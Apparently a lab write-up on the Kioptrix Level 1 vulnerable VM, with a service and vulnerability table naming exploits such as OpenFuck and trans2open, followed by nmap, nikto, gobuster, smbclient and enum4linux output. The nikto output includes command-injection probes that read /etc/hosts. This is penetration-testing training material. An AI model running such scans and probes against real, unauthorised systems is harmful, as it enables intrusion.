# Level 1

| Proto | port    | Service/URL                        | Info  | Potential Vulns | Verified Vulns | 
|-------|---------|------------------------------------|-------|-----------------|----------------|
| TCP   | 22      | SSH                                | OpenSSH 2.9p2 (protocol 1.99) <br> ssh-hostkey 1024 <br> Server supports SSHv1 <br> old key exchange / ciphers : DH SHA1/AES128-CBC | [Off-By-One](https://www.securityfocus.com/bid/4241/info) <br> [Kerberos 4 TGT/AFS Token Buffer Overflow](https://www.exploit-db.com/exploits/21402) |
| TCP   | 80,443  | HTTP/S                             | Apache httpd 1.3.20 <br> PHP (4?) <br> Unix Red-Hat/Linux <br> mod_ssl/2.8.4 <br> OpenSSL/0.9.6b <br> SSLv2 <br> Allowed methods: GET, HEAD, OPTIONS, TRACE <br> No security headers configured <br> HTTP-Title: Test Page for the Apache Web Server on Red Hat Linux <br> Webalizer Version 2.01 (https://192.168.88.129/usage/) <br> servername: kioptrix.level1 |  [OpenFuck](https://github.com/heltonWernik/OpenLuck) <br> [HTDigest Realm Command Line Argument Buffer Overflow](https://www.exploit-db.com/exploits/25625) <br> [Remote Users Disclosure](https://www.exploit-db.com/exploits/132) <br> [mod_mylo](https://www.exploit-db.com/exploits/67) <br> [Directory Index Disclosure](https://www.exploit-db.com/exploits/21002) <br> [Artificially Long Slash Path Directory Listing 1](https://www.exploit-db.com/exploits/20692) <br> [Artificially Long Slash Path Directory Listing 3](https://www.exploit-db.com/exploits/20694) <br> [Artificially Long Slash Path Directory Listing 4](https://www.exploit-db.com/exploits/20692) <br> [PHP4](https://www.exploit-db.com/search?q=PHP+4) <br> [DROWN](https://drownattack.com/) | OpenFuck |
| TCP   | 111     | rpcbind                            | 2 (RPC #100000) |
| TCP   | 139     | netbios-ssn                        | Samba smbd 2.2.1a <br> workgroup MYGROUP <br> ADMIN$ no anon access <br> IPC$ anon access | [trans2open](https://www.exploit-db.com/exploits/16861) <br> [trans2root](https://www.exploit-db.com/exploits/7) <br> [sambal](https://www.exploit-db.com/exploits/10) | trans2open <br> sambal |
| TCP   | 32768   | RPCstatus                          | 1 (RPC #100024) |

## Enum

### TCP

```bash
nmap -T4 -p- -A 192.168.88.129
```

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 23:00 CET
Nmap scan report for 192.168.88.129
Host is up (0.00026s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2019-12-29T23:04:00+00:00; +1h01m51s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:CE:A7:CD (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 1h01m50s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.88.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.55 seconds
```

### UDP

```bash
nmap -sU -T4 192.168.88.129
```

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 23:07 CET
Nmap scan report for 192.168.88.129
Host is up (0.00027s latency).
Not shown: 950 closed ports, 48 open|filtered ports
PORT    STATE SERVICE
111/udp open  rpcbind
137/udp open  netbios-ns
MAC Address: 00:0C:29:CE:A7:CD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1027.39 seconds
```

### 192.168.88.129 - 80/443

| Time | URL | Finding |
|------|-----|---------|
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **Default webpage** <br> Apache <br> PHP <br> Red Hat | 
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **Outdated software** <br> OpenSSL/0.9.6b <br> Apache/1.3.20  <br> mod_ssl/2.8.4  |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/manual/index.html | **information disclousure**  <br> Apache/1.3.20 Server at 127.0.0.1 Port 443 |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **information disclousure** <br> Server may leak inodes via ETags, header found with file / <br> inode: 34821, size: 2890, mtime: Thu Sep  6 05:12:46 2001 |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **Missing header**    <br> The anti-clickjacking X-Frame-Options header is not present. |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **Missing header**    <br> The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **Missing header**    <br> The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **Allowed HTTP Methods** <br> GET, HEAD, OPTIONS, TRACE |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **OSVDB-27487**       <br> Apache is vulnerable to XSS via the Expect header |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **OSVDB-838**         <br> Apache/1.3.20 <br> Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. <br> CAN-2002-0392 |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **OSVDB-4552**        <br> Apache/1.3.20 <br> Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839. |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **OSVDB-2733**        <br> Apache/1.3.20 <br> Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. <br> CAN-2003-0542 |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **OSVDB-877**         <br> HTTP TRACE method is active, suggesting the host is vulnerable to XST |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **OSVDB-756**         <br> mod_ssl/2.8.4 <br> mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. <br> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082 |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/ | **OSVDB-877**         <br> HTTP TRACE method is active, suggesting the host is vulnerable to XST |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/usage/ | **OSVDB-682**   <br> Webalizer Version 2.01 <br> Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/usage/ | **Information Disclousure**   <br> kioptrix.level1 |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/manual/ | **OSVDB-3268** <br> /manual/: Directory indexing found. |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/manual/ | **OSVDB-3092** <br> Perl manual. |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/icons/ | **OSVDB-3268** <br> Directory indexing found. |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/icons/ | **OSVDB-3233** <br> /icons/README: Apache default file found. |
| 2019-12-30 13:14:37 (GMT+1) | https://192.168.88.129/test.php | **Custom test page** <br> `<?php4 print "TEST"; ?>` |

#### Nikto

```bash
nikto -h 192.168.88.129
```

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.88.129
+ Target Hostname:    192.168.88.129
+ Target Port:        80
+ Start Time:         2019-12-30 13:14:37 (GMT1)
---------------------------------------------------------------------------                                                                                
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b                                                                               
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 05:12:46 2001                                    
+ The anti-clickjacking X-Frame-Options header is not present.                                                                                             
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                  
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type  
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header                                                                                           
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)                                                         
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.                                          
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.                                   
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.                               
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.                               
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE                                                                                                          
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST                                                                         
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.                                                    
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).                                    
+ OSVDB-3268: /manual/: Directory indexing found.                                                                                                          
+ OSVDB-3092: /manual/: Web server manual found.                                                                                                           
+ OSVDB-3268: /icons/: Directory indexing found.                                                                                                           
+ OSVDB-3233: /icons/README: Apache default file found.                                                                                                    
+ OSVDB-3092: /test.php: This might be interesting...                                                                                                      
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.                                     
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.                            
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.                                                
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.                                       
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.                                               
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.                                      
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.                                                                           
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.                                                                  
+ /shell?cat+/etc/hosts: A backdoor was identified.                                                                                                        
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host                                                                                         
+ End Time:           2019-12-30 13:14:58 (GMT1) (21 seconds)                                                                                              
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### dirbuster

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Mon Dec 30 23:08:49 CET 2019
--------------------------------

http://192.168.88.129:80
--------------------------------
Directories found during testing:

Dirs found with a 403 response:

/cgi-bin/
/doc/

Dirs found with a 200 response:

/icons/
/
/manual/
/manual/mod/
/icons/small/
/usage/
/mrtg/
/manual/mod/mod_perl/
/manual/mod/mod_ssl/

--------------------------------
Files found during testing:

Files found with a 200 responce:

/test.php
/usage/usage_201912.html
/usage/usage_200909.html
/mrtg/mrtg.html
/mrtg/unix-guide.html
/mrtg/nt-guide.html
/mrtg/cfgmaker.html
/mrtg/indexmaker.html
/mrtg/reference.html
/mrtg/faq.html
/mrtg/forum.html
/mrtg/contrib.html
/mrtg/mrtg-rrd.html
/mrtg/logfile.html
/mrtg/mibhelp.html
/mrtg/squid.html
/mrtg/webserver.html
/manual/mod/mod_ssl/ssl_overview.html
/manual/mod/mod_ssl/index.html
/manual/mod/mod_ssl/ssl_intro.html
/manual/mod/mod_ssl/ssl_howto.html
/manual/mod/mod_ssl/ssl_compat.html
/manual/mod/mod_ssl/ssl_reference.html
/manual/mod/mod_ssl/ssl_faq.html
/manual/mod/mod_ssl/ssl_glossary.html

--------------------------------
```

#### gobuster

```bash
gobuster dir -u http://192.168.88.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 40 -e
```

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.88.129
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2019/12/31 12:07:10 Starting gobuster
===============================================================
http://192.168.88.129/index.html (Status: 200)
http://192.168.88.129/test.php (Status: 200)
http://192.168.88.129/manual (Status: 301)
http://192.168.88.129/usage (Status: 301)
http://192.168.88.129/mrtg (Status: 301)
===============================================================
2019/12/31 12:34:23 Finished
===============================================================
```

### 192.168.88.129 - 111/139

| Time                | command/module                       | Finding                    |
|---------------------|--------------------------------------|----------------------------|
| 2019-12-31 13:22:06 | auxiliary(scanner/smb/smb_version)   | Samba 2.2.1a               |
| 2019-12-31 13:35:59 | nmap/smbclient                       | NetBIOS <br> KIOPTRIX      |
| 2019-12-31 13:35:59 | nmap/smbclient                       | workgroup <br> MYGROUP     |
| 2019-12-31 13:35:59 | smbclient                            | ADMIN$ <br>  no anon acces |
| 2019-12-31 13:35:59 | smbclient                            | IPC$ <br> no anon acces    |

#### MSF

```bash
msf5 auxiliary(scanner/smb/smb_version)
```

```bash
[*] 192.168.88.129:139    - Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.88.129:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### smbclient

```bash
smbclient -L \\\\192.168.88.129\\
```

```bash
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP
```

```bash
smbclient \\\\192.168.88.129\\ADMIN$
```

```bash
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Enter WORKGROUP\root's password: 
tree connect failed: NT_STATUS_WRONG_PASSWORD
```

```bash
smbclient \\\\192.168.88.129\\IPC$
```

```bash
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> 
```

#### Enum4Linux

```bash
enum4linux -a 192.168.88.129
```

```text
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan  2 16:24:28 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.88.129
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.88.129    |
 ====================================================== 
[+] Got domain/workgroup name: MYGROUP

 ============================================== 
|    Nbtstat Information for 192.168.88.129    |
 ============================================== 
Looking up status of 192.168.88.129
        KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
        KIOPTRIX        <03> -         B <ACTIVE>  Messenger Service
        KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        MYGROUP         <1d> -         B <ACTIVE>  Master Browser
        MYGROUP         <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.88.129    |
 ======================================= 
[+] Server 192.168.88.129 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.88.129    |
 ============================================= 
Domain Name: MYGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.88.129    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.88.129 from smbclient: 
[+] Got OS info for 192.168.88.129 from srvinfo:
        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
        platform_id     :       500
        os version      :       4.5
        server type     :       0x9a03

 =============================== 
|    Users on 192.168.88.129    |
 =============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 =========================================== 
|    Share Enumeration on 192.168.88.129    |
 =========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX

[+] Attempting to map shares on 192.168.88.129
//192.168.88.129/IPC$   [E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//192.168.88.129/ADMIN$ [E] Can't understand response:
tree connect failed: NT_STATUS_WRONG_PASSWORD

 ====================================================== 
|    Password Policy Information for 192.168.88.129    |
 ====================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 192.168.88.129 using a NULL share

[+] Trying protocol 445/SMB...

        [!] Protocol failed: [Errno Connection error (192.168.88.129:445)] [Errno 111] Connection refused

[+] Trying protocol 139/SMB...

        [!] Protocol failed: SMB SessionError: 0x5


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


 ================================ 
|    Groups on 192.168.88.129    |
 ================================ 

[+] Getting builtin groups:
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Power Users] rid:[0x223]
group:[Account Operators] rid:[0x224]
group:[System Operators] rid:[0x225]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]

[+] Getting builtin group memberships:
Group 'Account Operators' (RID: 548) has member: Couldn't find group Account Operators
Group 'Print Operators' (RID: 550) has member: Couldn't find group Print Operators
Group 'System Operators' (RID: 549) has member: Couldn't find group System Operators
Group 'Replicator' (RID: 552) has member: Couldn't find group Replicator
Group 'Guests' (RID: 546) has member: Couldn't find group Guests
Group 'Users' (RID: 545) has member: Couldn't find group Users
Group 'Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators
Group 'Administrators' (RID: 544) has member: Couldn't find group Administrators
Group 'Power Users' (RID: 547) has member: Couldn't find group Power Users

[+] Getting local groups:
group:[sys] rid:[0x3ef]
group:[tty] rid:[0x3f3]
group:[disk] rid:[0x3f5]
group:[mem] rid:[0x3f9]
group:[kmem] rid:[0x3fb]
group:[wheel] rid:[0x3fd]
group:[man] rid:[0x407]
group:[dip] rid:[0x439]
group:[lock] rid:[0x455]
group:[users] rid:[0x4b1]
group:[slocate] rid:[0x413]
group:[floppy] rid:[0x40f]
group:[utmp] rid:[0x415]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]

[+] Getting domain group memberships:
Group 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users
Group 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins

 ========================================================================= 
|    Users on 192.168.88.129 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623
[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''
S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\
                                                        (0)
S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)
S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)
